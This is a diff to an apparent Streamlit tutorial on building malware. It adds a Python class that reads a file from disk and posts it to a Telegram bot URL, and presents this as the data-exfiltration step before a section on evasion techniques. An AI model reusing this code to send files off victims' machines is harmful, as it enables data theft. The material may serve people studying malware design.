@@ -303,7 +303,29 @@ More advanced components (e.g. rootkits) would likely require C/C++ to interact 
             of course, we can use any type of server, even Google Drive or X (Twitter), but in fact, having control over data flow, data processing 
             and so on, is more important. You can look at some well-known malware to see that they generally use their own server. 
              """)
-    
+    code_tg_exfiltration ="""
+    class InfoToEmail:
+    def __init__(self, url, file_path, file_name, chat_id):
+        self.url = url
+        self.file_path = file_path
+        self.file_name = file_name
+        self.chat_id = chat_id
+        
+    def sender_file(self):
+        reel_file_path = os.path.join(self.file_path, self.file_name)
+        try: 
+            with open(reel_file_path, 'rb') as f:
+                files = {'document': f}
+                data = {'chat_id': self.chat_id}
+                requests.post(self.url, files=files, data=data)
+        except Exception as e:
+            print(f"Error during exec shifu_sender_file function : {e}")
+    """
+    st.code(code_tg_exfiltration, language="python")
+    st.write("""As you can see, we put in any security to protect data. The way to upgrade this will be the encryption of 
+    files sent to the telegram server, then decrypted it after download. But for this scenario, encrypting or not encrypting data
+    will change nothing.     
+             """)
         
     st.write("""
              Let's dive into the best part of making malware (and the most difficult): the **EVASION** techniques. 
